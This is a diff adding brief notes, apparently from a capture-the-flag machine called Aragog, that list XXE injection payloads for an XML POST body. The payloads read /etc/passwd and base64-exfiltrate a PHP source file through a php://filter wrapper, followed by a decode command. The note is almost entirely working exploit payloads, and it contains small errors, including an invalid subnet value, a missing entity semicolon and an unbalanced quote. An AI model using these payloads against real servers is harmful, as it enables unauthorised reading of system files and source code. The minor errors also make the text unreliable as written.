@@ -1,1 +1,28 @@
--
+Server: Aragog @10:26
+
+modify the post from this:
+<details>
+  <subnet_mask>255.255.255.292</subnet_mask>
+  <test></test>
+</details>
+
+to this:
+<?xml version="1.0"?>
+<!DOCTYPE replace [<!ENTITY whatever SYSTEM "/etc/passwd"> ]>
+<details>
+  <subnet_mask>&whatever</subnet_mask>
+  <test></test>
+</details>
+
+or to this:
+<?xml version="1.0"?>
+<!DOCTYPE replace [<!ENTITY whatever SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/hosts.php"> ]>
+<details>
+  <subnet_mask>&whatever</subnet_mask>
+  <test></test>
+</details>
+
+Then take encoded-output (clipboard) and do this:
+echo -n "encoded-output from clipboard) | base64 -d
+
+  
